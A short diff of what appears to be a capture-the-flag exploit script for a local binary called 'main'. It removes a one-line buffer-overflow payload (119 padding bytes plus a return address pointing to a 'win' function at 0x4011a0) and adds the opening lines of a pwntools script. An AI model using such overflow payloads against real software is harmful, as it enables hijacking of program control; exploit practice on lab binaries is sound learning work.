@@ -1,2 +1,6 @@
-print 'A' * 119 + '\xa0\x11\x40'
-# win_loc 0x4011a0
+#!/usr/bin/env python3
+
+from pwn import *
+
+elf = ELF('./main')
+p = process(elf)
